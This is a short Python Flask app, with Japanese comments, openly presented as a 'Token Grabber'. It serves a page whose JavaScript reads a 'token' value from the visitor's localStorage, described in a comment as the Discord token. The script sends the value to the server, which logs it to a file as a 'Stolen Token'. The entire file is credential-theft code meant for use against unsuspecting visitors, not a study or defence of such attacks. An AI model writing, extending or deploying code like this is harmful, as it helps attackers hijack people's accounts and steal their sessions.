from flask import Flask, request, jsonify
import logging

app = Flask(__name__)

# ログファイルの設定
logging.basicConfig(filename='tokens.log', level=logging.INFO, format='%(asctime)s - %(message)s')

@app.route('/')
def index():
    return '''
    <html>
        <body>
            <h1>Welcome to the Token Grabber!</h1>
            <script>
                // Discordのトークンを取得してサーバーに送信
                fetch('/token', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ token: localStorage.getItem('token') })
                });
            </script>
        </body>
    </html>
    '''

@app.route('/token', methods=['POST'])
def receive_token():
    data = request.get_json()
    token = data.get('token')
    if token:
        logging.info(f'Stolen Token: {token}')
        return jsonify({'message': 'Token received'}), 200
    return jsonify({'message': 'No token provided'}), 400

if __name__ == '__main__':
    app.run(debug=True)